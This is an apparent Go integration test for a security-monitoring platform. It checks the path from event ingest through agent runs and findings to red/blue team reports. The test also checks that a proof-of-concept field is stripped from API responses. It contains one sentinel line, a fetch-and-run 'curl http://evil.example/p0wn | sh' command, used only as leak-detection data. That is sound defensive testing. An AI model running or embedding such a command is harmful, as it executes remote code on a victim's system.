//go:build integration

package server

import (
	"bytes"
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
	"time"

	"github.com/jackc/pgx/v5/pgxpool"
	"github.com/testcontainers/testcontainers-go"
	tcpostgres "github.com/testcontainers/testcontainers-go/modules/postgres"
	"github.com/testcontainers/testcontainers-go/wait"
	"golang.org/x/crypto/bcrypt"

	"github.com/bellu/bellu-ai-cyber/internal/auth"
	"github.com/bellu/bellu-ai-cyber/internal/finding"
	"github.com/bellu/bellu-ai-cyber/internal/store"
)

// This file proves the full continuous-monitoring loop connects end to end
// against a real Postgres (testcontainers) through the Server.Handler() HTTP
// stack — the same harness style as findings_handlers_integration_test.go. It
// is gated behind the `integration` build tag, so it only runs when a container
// runtime is available (`go test -tags integration ./backend/server/...`).
//
// The single cohesive test (TestContinuousMonitoringLoopEndToEnd) walks the
// seam a routed event takes from ingest to the operator-facing reads:
//
//	ingest  -> POST /api/monitor/events          (persisted + routed, team set)
//	claim   -> POST /api/agent/monitor/claim     (SKIP LOCKED; read-only run launched, run_id stamped)
//	trace   -> POST /api/agent/runs/:id/trace    (agents mapped to stages + a handoff)
//	detail  -> GET  /api/agent/runs/:id/detail   (header + 11-stage stage-flow leg counts)
//	timeline-> GET  /api/agent/runs/:id/timeline (ordered agent-start + handoff events)
//	finding -> POST /api/agent/findings:ingest    (one finding)
//	report  -> POST /api/agent/findings/reports   (red + blue artifacts, PoC body stripped)
//	readfind-> GET  /api/findings/:id            (finding + red/blue reports + triggered_by; NO PoC body)
//	status  -> PUT  /api/agent/runs/:id/status   (completed; folds onto run AND monitor_events)
//	grid    -> GET  /api/monitor/events          (reflects the terminal state + run_id)
//	fallback-> GET  /api/findings/:id (no report) (200 with reports: [])
//
// It exercises Requirements 7.1, 7.2, 8.1, 12.1, 13.1, 17.1, 17.2 and the
// cross-cutting safety invariant that no weaponized poc_script_code body leaks
// into any API response (Property 6, Req 16.3).

// pocBody is a sentinel weaponized proof-of-concept body. The test sends it in
// the report sections and then asserts it NEVER appears anywhere in the
// extended finding-detail response (Property 6 / Req 16.3). The store strips the
// poc_script_code key at any nesting level, so only the poc_available flag is
// ever persisted or returned.
const pocBody = "curl http://evil.example/p0wn | sh # WEAPONIZED-POC-BODY"

// --- harness -----------------------------------------------------------------

// loopEnv is the wired server plus a single service-account token. The agent
// service account holds exactly the permission set the loop needs:
// monitor:ingest, agent:run, findings:read, and findings:ingest (see
// auth.RoleAgentServiceAccount), so one token drives every seam in the loop and
// the test does not have to juggle several principals.
type loopEnv struct {
	srv   http.Handler
	store *store.Store
	token string
	orgID int64
}

// newLoopEnv spins up a disposable Postgres, migrates, seeds the RBAC catalog,
// and binds one agent-service-account principal to the seeded org. It returns a
// wired Server handler and that principal's freshly minted login token.
func newLoopEnv(t *testing.T) *loopEnv {
	t.Helper()
	ctx := context.Background()

	ctr, err := tcpostgres.Run(ctx, "postgres:16-alpine",
		tcpostgres.WithDatabase("bellu"),
		tcpostgres.WithUsername("bellu"),
		tcpostgres.WithPassword("bellu"),
		testcontainers.WithWaitStrategy(
			wait.ForLog("database system is ready to accept connections").
				WithOccurrence(2).WithStartupTimeout(60*time.Second)),
	)
	if err != nil {
		t.Fatalf("start postgres: %v", err)
	}
	t.Cleanup(func() { _ = ctr.Terminate(ctx) })

	dsn, err := ctr.ConnectionString(ctx, "sslmode=disable")
	if err != nil {
		t.Fatalf("conn string: %v", err)
	}
	st, err := store.Open(ctx, dsn)
	if err != nil {
		t.Fatalf("open store: %v", err)
	}
	t.Cleanup(st.Close)
	if err := st.Migrate(ctx); err != nil {
		t.Fatalf("migrate: %v", err)
	}

	// Seed the RBAC catalog (permissions + built-in roles, including the agent
	// service account) and the org the principal binds to.
	authStore := auth.NewStore(st.Pool())
	const adminEmail, adminPassword = "admin@bellu.test", "admin-secret"
	if _, err := authStore.Seed(ctx, adminEmail, adminPassword, "Test Org"); err != nil {
		t.Fatalf("seed rbac: %v", err)
	}

	var orgID int64
	if err := st.Pool().QueryRow(ctx,
		`SELECT id FROM organizations ORDER BY id LIMIT 1`).Scan(&orgID); err != nil {
		t.Fatalf("read org: %v", err)
	}

	// The agent service account holds monitor:ingest + agent:run +
	// findings:read + findings:ingest — every permission the loop touches.
	const saEmail, saPassword = "svc@bellu.test", "svc-secret"
	seedLoopUserWithRole(t, ctx, st.Pool(), saEmail, saPassword, auth.RoleAgentServiceAccount)

	tokens := auth.NewTokenManager("test-secret", time.Hour)
	svc := auth.NewService(authStore, tokens)
	srv := New(Options{Store: st, Auth: svc}).Handler()

	return &loopEnv{
		srv:   srv,
		store: st,
		token: loopLogin(t, srv, saEmail, saPassword),
		orgID: orgID,
	}
}

// seedLoopUserWithRole inserts an active user bound org-wide to the given
// built-in role, so LoadPrincipal resolves exactly that role's permission set.
// It mirrors seedUserWithRole in findings_handlers_integration_test.go but is
// named distinctly to avoid colliding with that file's helper in the same
// package build.
func seedLoopUserWithRole(t *testing.T, ctx context.Context, pool *pgxpool.Pool, email, password, roleKey string) {
	t.Helper()
	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		t.Fatalf("hash password: %v", err)
	}
	var orgID int64
	if err := pool.QueryRow(ctx, `SELECT id FROM organizations ORDER BY id LIMIT 1`).Scan(&orgID); err != nil {
		t.Fatalf("read org: %v", err)
	}
	var userID int64
	if err := pool.QueryRow(ctx,
		`INSERT INTO users (org_id, email, name, password_hash, active)
		 VALUES ($1,$2,$3,$4,true) RETURNING id`,
		orgID, email, email, string(hash)).Scan(&userID); err != nil {
		t.Fatalf("insert user %s: %v", email, err)
	}
	var roleID int64
	if err := pool.QueryRow(ctx,
		`SELECT id FROM roles WHERE key=$1 AND builtin`, roleKey).Scan(&roleID); err != nil {
		t.Fatalf("read role %s: %v", roleKey, err)
	}
	if _, err := pool.Exec(ctx,
		`INSERT INTO memberships (user_id, role_id, project_id) VALUES ($1,$2,NULL)`,
		userID, roleID); err != nil {
		t.Fatalf("insert membership %s/%s: %v", email, roleKey, err)
	}
}

// loopLogin posts credentials to /api/auth/login and returns the issued JWT.
func loopLogin(t *testing.T, srv http.Handler, email, password string) string {
	t.Helper()
	body, _ := json.Marshal(map[string]string{"email": email, "password": password})
	req := httptest.NewRequest("POST", "/api/auth/login", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	srv.ServeHTTP(rec, req)
	if rec.Code != http.StatusOK {
		t.Fatalf("login %s: status %d, body %s", email, rec.Code, rec.Body.String())
	}
	var out struct {
		Token string `json:"token"`
	}
	if err := json.Unmarshal(rec.Body.Bytes(), &out); err != nil {
		t.Fatalf("login %s: decode: %v", email, err)
	}
	if out.Token == "" {
		t.Fatalf("login %s: empty token", email)
	}
	return out.Token
}

// doJSON issues an authenticated request with an optional JSON body and returns
// the recorder. A nil body sends no payload (for GETs).
func (e *loopEnv) doJSON(t *testing.T, method, path string, body any) *httptest.ResponseRecorder {
	t.Helper()
	var r *http.Request
	if body != nil {
		buf, err := json.Marshal(body)
		if err != nil {
			t.Fatalf("marshal %s %s body: %v", method, path, err)
		}
		r = httptest.NewRequest(method, path, bytes.NewReader(buf))
		r.Header.Set("Content-Type", "application/json")
	} else {
		r = httptest.NewRequest(method, path, nil)
	}
	r.Header.Set("Authorization", "Bearer "+e.token)
	rec := httptest.NewRecorder()
	e.srv.ServeHTTP(rec, r)
	return rec
}

// decode unmarshals a recorder's JSON body into v, failing on a non-2xx status.
func decode(t *testing.T, rec *httptest.ResponseRecorder, wantCode int, v any) {
	t.Helper()
	if rec.Code != wantCode {
		t.Fatalf("status %d, want %d (body %s)", rec.Code, wantCode, rec.Body.String())
	}
	if v != nil {
		if err := json.Unmarshal(rec.Body.Bytes(), v); err != nil {
			t.Fatalf("decode body %q: %v", rec.Body.String(), err)
		}
	}
}

// --- the end-to-end loop -----------------------------------------------------

func TestContinuousMonitoringLoopEndToEnd(t *testing.T) {
	env := newLoopEnv(t)

	// Fixed asset identity the loop threads end to end: the ingested event's
	// payload carries a canonical target, the finding keys on (assetID, vulnID),
	// and the report resolves back to the finding by that same key.
	const (
		assetID = "repo:github:octo/app"
		vulnID  = "CVE-2024-9001"
	)

	// 1) Ingest an event. A GitHub check_run payload classifies to event_kind
	//    "ci", which the static routing table sends to the red_team. The payload
	//    carries a canonical_id so the auto-triggered run gets a real target.
	ingestPayload := mustJSON(t, map[string]any{
		"event_type":   "check_run",
		"check_run":    map[string]any{"status": "completed", "conclusion": "failure"},
		"canonical_id": assetID,
	})
	var ingested struct {
		ID    int64  `json:"id"`
		State string `json:"state"`
	}
	decode(t, env.doJSON(t, "POST", "/api/monitor/events", map[string]any{
		"source":      "github",
		"delivery_id": "delivery-ci-0001",
		"payload":     ingestPayload,
	}), http.StatusAccepted, &ingested)

	if ingested.State != "routed" {
		t.Fatalf("ingest state = %q, want routed", ingested.State)
	}
	if ingested.ID == 0 {
		t.Fatalf("ingest returned no event id")
	}

	// The event is persisted AND routed to the red_team per the static table
	// (Req 8.1). Read it back on the grid to confirm the routed state + team.
	eventBefore := findEvent(t, env, ingested.ID)
	if eventBefore.State != "routed" || eventBefore.Team != "red_team" {
		t.Fatalf("persisted event state/team = %q/%q, want routed/red_team", eventBefore.State, eventBefore.Team)
	}
	if eventBefore.RunID != "" {
		t.Fatalf("event already has run_id %q before claim", eventBefore.RunID)
	}

	// 2) Claim it via the SKIP LOCKED path. A read-only agent run is launched
	//    for the claimed row and its run_id is stamped onto the event (Req 6.3).
	var claimResp struct {
		Claims []struct {
			ID    int64  `json:"id"`
			RunID string `json:"run_id"`
			State string `json:"state"`
		} `json:"claims"`
	}
	decode(t, env.doJSON(t, "POST", "/api/agent/monitor/claim", map[string]any{"limit": 10}),
		http.StatusOK, &claimResp)

	if len(claimResp.Claims) != 1 {
		t.Fatalf("claim returned %d rows, want exactly 1", len(claimResp.Claims))
	}
	claim := claimResp.Claims[0]
	if claim.ID != ingested.ID {
		t.Fatalf("claimed event id %d, want %d", claim.ID, ingested.ID)
	}
	runID := claim.RunID
	if runID == "" {
		t.Fatalf("claim launched no run (empty run_id)")
	}

	// The launched run is strictly READ-ONLY: authz_scope NULL / active_testing
	// false (Property 5 / Req 9.1). GetAgentRun surfaces active_testing; the run
	// detail's scope_rules (len of the allow list) is 0 for a nil scope.
	var runStatus struct {
		RunID         string `json:"run_id"`
		Status        string `json:"status"`
		ActiveTesting bool   `json:"active_testing"`
	}
	decode(t, env.doJSON(t, "GET", "/api/agent/runs/"+runID, nil), http.StatusOK, &runStatus)
	if runStatus.ActiveTesting {
		t.Fatalf("auto-triggered run has active_testing=true, want false (read-only)")
	}

	// The run_id is stamped on the event (link established at claim).
	eventClaimed := findEvent(t, env, ingested.ID)
	if eventClaimed.RunID != runID {
		t.Fatalf("event run_id = %q, want %q", eventClaimed.RunID, runID)
	}
	if eventClaimed.State != "claimed" {
		t.Fatalf("event state after claim = %q, want claimed", eventClaimed.State)
	}

	// 3) Report a trace write-back: two agents mapping to known stages plus a
	//    handoff between them. "recon-agent" -> RECON, "exploit-agent" ->
	//    EXPLOIT; the handoff edge is recon -> exploit.
	start := time.Date(2024, 5, 1, 10, 0, 0, 0, time.UTC)
	traceBody := map[string]any{
		"agents": []map[string]any{
			{
				"agent_id":   "a1",
				"agent_name": "recon-agent",
				"outcome":    "completed",
				"started_at": start,
				"ended_at":   start.Add(30 * time.Second),
			},
			{
				"agent_id":   "a2",
				"agent_name": "exploit-agent",
				"parent_id":  "a1",
				"outcome":    "completed",
				"started_at": start.Add(30 * time.Second),
				"ended_at":   start.Add(90 * time.Second),
			},
		},
		"handoffs": []map[string]any{
			{"from_agent_id": "a1", "to_agent_id": "a2", "at": start.Add(30 * time.Second)},
		},
	}
	var traceResp struct {
		AgentsCount   int `json:"agents_count"`
		HandoffsCount int `json:"handoffs_count"`
	}
	decode(t, env.doJSON(t, "POST", "/api/agent/runs/"+runID+"/trace", traceBody),
		http.StatusOK, &traceResp)
	if traceResp.AgentsCount != 2 || traceResp.HandoffsCount != 1 {
		t.Fatalf("trace counts = %d agents / %d handoffs, want 2 / 1",
			traceResp.AgentsCount, traceResp.HandoffsCount)
	}

	// 4a) Run detail: header (triggered_by, counts, duration) + the 11-stage
	//     stage-flow with correct per-stage leg counts (Req 13.1).
	var detail struct {
		RunID         string `json:"run_id"`
		TriggeredBy   string `json:"triggered_by"`
		DurationMS    *int64 `json:"duration_ms"`
		AgentsCount   int    `json:"agents_count"`
		HandoffsCount int    `json:"handoffs_count"`
		ScopeRules    int    `json:"scope_rules"`
		StageFlow     []struct {
			Stage    string `json:"stage"`
			LegCount int    `json:"leg_count"`
		} `json:"stage_flow"`
	}
	decode(t, env.doJSON(t, "GET", "/api/agent/runs/"+runID+"/detail", nil), http.StatusOK, &detail)

	// triggered_by is the launching monitor_event id (not "manual"): this run was
	// auto-triggered by the claim, not an operator launch.
	if detail.TriggeredBy == "" || detail.TriggeredBy == "manual" {
		t.Fatalf("detail triggered_by = %q, want the launching event id", detail.TriggeredBy)
	}
	if detail.AgentsCount != 2 || detail.HandoffsCount != 1 {
		t.Fatalf("detail counts = %d/%d, want 2/1", detail.AgentsCount, detail.HandoffsCount)
	}
	if detail.ScopeRules != 0 {
		t.Fatalf("detail scope_rules = %d, want 0 (read-only run has no scope)", detail.ScopeRules)
	}
	// The stage-flow lists exactly the 11 pipeline stages, and RECON + EXPLOIT
	// each carry exactly one leg while every other stage is empty. The leg-count
	// total equals the number of emitted agents (Property 8).
	if len(detail.StageFlow) != 11 {
		t.Fatalf("stage_flow has %d stages, want 11", len(detail.StageFlow))
	}
	legByStage := map[string]int{}
	total := 0
	for _, sf := range detail.StageFlow {
		legByStage[sf.Stage] = sf.LegCount
		total += sf.LegCount
	}
	if legByStage["RECON"] != 1 || legByStage["EXPLOIT"] != 1 {
		t.Fatalf("stage leg counts RECON=%d EXPLOIT=%d, want 1/1 (full flow %v)",
			legByStage["RECON"], legByStage["EXPLOIT"], legByStage)
	}
	if total != 2 {
		t.Fatalf("sum of stage leg counts = %d, want 2 (one per emitted agent)", total)
	}

	// 4b) Timeline: agent-start + handoff events in one list, ascending by
	//     timestamp (Req 13.4). Two starts (a1, a2) + one handoff = 3 events, and
	//     a1's start sorts before the a1->a2 handoff (same ts, tie broken by id).
	var timeline struct {
		Events []struct {
			Kind      string `json:"kind"`
			AgentID   string `json:"agent_id"`
			AgentName string `json:"agent_name"`
		} `json:"events"`
	}
	decode(t, env.doJSON(t, "GET", "/api/agent/runs/"+runID+"/timeline", nil), http.StatusOK, &timeline)
	if len(timeline.Events) != 3 {
		t.Fatalf("timeline has %d events, want 3 (2 starts + 1 handoff)", len(timeline.Events))
	}
	if timeline.Events[0].Kind != store.TimelineAgentStart || timeline.Events[0].AgentID != "a1" {
		t.Fatalf("first timeline event = %+v, want a1 agent_start", timeline.Events[0])
	}

	// 5a) Ingest a finding keyed on (assetID, vulnID), linked to a Package asset.
	var ingestFindResp struct {
		Created  int `json:"created"`
		Rejected int `json:"rejected"`
	}
	decode(t, env.doJSON(t, "POST", "/api/agent/findings:ingest", map[string]any{
		"run_id": runID,
		"findings": []map[string]any{
			{
				"asset_id":   assetID,
				"asset_kind": "Package",
				"vuln_id":    vulnID,
				"risk_score": 88,
				"severity":   "high",
			},
		},
	}), http.StatusOK, &ingestFindResp)
	if ingestFindResp.Created != 1 || ingestFindResp.Rejected != 0 {
		t.Fatalf("finding ingest created/rejected = %d/%d, want 1/0",
			ingestFindResp.Created, ingestFindResp.Rejected)
	}

	// Resolve the finding id by its dedup key so the detail read can be targeted.
	findingID := env.findingID(t, assetID, vulnID)

	// 5b) Report artifacts for BOTH teams. Each carries a poc_script_code body in
	//     its sections that the store MUST strip (Property 6): only the
	//     poc_available flag survives. The report links to the run via run_id so
	//     the finding detail can surface triggered_by (Req 17.1).
	for _, team := range []string{"red", "blue"} {
		sections := mustJSON(t, map[string]any{
			"summary":         team + " team analysis",
			"poc_script_code": pocBody, // MUST be stripped by the store (P6)
			"nested": map[string]any{
				"poc_script_code": pocBody, // stripped at any nesting level too
				"note":            "kept",
			},
		})
		decode(t, env.doJSON(t, "POST", "/api/agent/findings/reports", map[string]any{
			"finding_id":    findingID,
			"run_id":        runID,
			"team":          team,
			"title":         team + " report",
			"severity":      "high",
			"poc_available": true,
			"sections":      sections,
			"rendered_markdown": "# " + team + " report\n\nsee details",
		}), http.StatusOK, nil)
	}

	// 5c) Extended finding read: the finding + BOTH reports (red + blue) +
	//     triggered_by, and crucially NO poc_script_code body anywhere in the
	//     response (Property 6 / Req 16.3, Req 17.1).
	findRec := env.doJSON(t, "GET", "/api/findings/"+itoa(findingID), nil)
	// Reports are serialized as store.FindingReport (its Go field names), so
	// decode into that type directly rather than guessing JSON tags.
	var findResp struct {
		Finding     map[string]any        `json:"finding"`
		TriggeredBy string                `json:"triggered_by"`
		Reports     []store.FindingReport `json:"reports"`
	}
	decode(t, findRec, http.StatusOK, &findResp)

	if len(findResp.Reports) != 2 {
		t.Fatalf("finding detail has %d reports, want 2 (red + blue)", len(findResp.Reports))
	}
	teams := map[string]bool{}
	for _, r := range findResp.Reports {
		teams[r.Team] = true
		if !r.PoCAvailable {
			t.Fatalf("report %q poc_available=false, want true (flag only)", r.Team)
		}
	}
	if !teams["red"] || !teams["blue"] {
		t.Fatalf("finding detail reports teams = %v, want both red and blue", teams)
	}
	// triggered_by is resolved from the auto-triggered run the report links to
	// (Req 17.1) and matches the launching event id stamped on the run detail.
	if findResp.TriggeredBy != detail.TriggeredBy {
		t.Fatalf("finding detail triggered_by = %q, want %q (the launching event)",
			findResp.TriggeredBy, detail.TriggeredBy)
	}
	// Safety: the weaponized PoC body must not appear ANYWHERE in the raw
	// response body — not in sections, not in rendered markdown, nowhere.
	if strings.Contains(findRec.Body.String(), pocBody) {
		t.Fatalf("finding detail response leaked the weaponized poc_script_code body")
	}

	// 6) Report a terminal status. 'completed' folds onto BOTH the run row and
	//    the linked monitor_events row (Req 7.1, 7.2).
	decode(t, env.doJSON(t, "PUT", "/api/agent/runs/"+runID+"/status", map[string]any{
		"status":         "completed",
		"findings_count": 1,
	}), http.StatusOK, nil)

	// The run reflects completed + the findings count.
	var runAfter struct {
		Status        string `json:"status"`
		FindingsCount int    `json:"findings_count"`
	}
	decode(t, env.doJSON(t, "GET", "/api/agent/runs/"+runID, nil), http.StatusOK, &runAfter)
	if runAfter.Status != "completed" || runAfter.FindingsCount != 1 {
		t.Fatalf("run after status = %q/%d, want completed/1", runAfter.Status, runAfter.FindingsCount)
	}

	// Mission Control grid reflects the folded terminal state on the event row,
	// still carrying the run_id link (Req 8.1, 7.2).
	eventDone := findEvent(t, env, ingested.ID)
	if eventDone.State != "completed" {
		t.Fatalf("monitor event state after status = %q, want completed", eventDone.State)
	}
	if eventDone.RunID != runID {
		t.Fatalf("monitor event run_id after status = %q, want %q", eventDone.RunID, runID)
	}

	// 7) Graceful fallback: a finding with NO report still returns 200 with
	//    reports: [] (Property 7 / Req 17.2). Ingest a second, report-less
	//    finding and read it back.
	const (
		assetID2 = "repo:github:octo/other"
		vulnID2  = "CVE-2024-9002"
	)
	decode(t, env.doJSON(t, "POST", "/api/agent/findings:ingest", map[string]any{
		"findings": []map[string]any{
			{"asset_id": assetID2, "asset_kind": "Package", "vuln_id": vulnID2,
				"risk_score": 10, "severity": "low"},
		},
	}), http.StatusOK, nil)
	noReportID := env.findingID(t, assetID2, vulnID2)

	var noReport struct {
		Reports     []any  `json:"reports"`
		TriggeredBy string `json:"triggered_by"`
	}
	decode(t, env.doJSON(t, "GET", "/api/findings/"+itoa(noReportID), nil), http.StatusOK, &noReport)
	if noReport.Reports == nil {
		t.Fatalf("no-report finding returned null reports, want [] (graceful fallback)")
	}
	if len(noReport.Reports) != 0 {
		t.Fatalf("no-report finding returned %d reports, want 0", len(noReport.Reports))
	}
}

// --- small helpers -----------------------------------------------------------

// findEvent returns the monitor event with the given id from the Mission
// Control grid read, failing if it is not present.
func findEvent(t *testing.T, env *loopEnv, id int64) monitorEventView {
	t.Helper()
	var out struct {
		Events []monitorEventView `json:"events"`
	}
	decode(t, env.doJSON(t, "GET", "/api/monitor/events", nil), http.StatusOK, &out)
	for _, e := range out.Events {
		if e.ID == id {
			return e
		}
	}
	t.Fatalf("event id %d not found in grid read", id)
	return monitorEventView{}
}

// findingID resolves a finding's surrogate id from its (asset_id, vuln_id)
// dedup key by querying the store directly — the test needs the numeric id to
// hit GET /api/findings/:id, and the ingest response does not return it.
func (e *loopEnv) findingID(t *testing.T, assetID, vulnID string) int64 {
	t.Helper()
	id, err := finding.NewStore(e.store).GetIDByKey(context.Background(), assetID, vulnID)
	if err != nil {
		t.Fatalf("resolve finding id (%s/%s): %v", assetID, vulnID, err)
	}
	return id
}

// mustJSON marshals v to json.RawMessage, failing the test on error.
func mustJSON(t *testing.T, v any) json.RawMessage {
	t.Helper()
	b, err := json.Marshal(v)
	if err != nil {
		t.Fatalf("marshal json: %v", err)
	}
	return b
}

// itoa renders an int64 as a decimal string for path building.
func itoa(n int64) string {
	return strconv.FormatInt(n, 10)
}
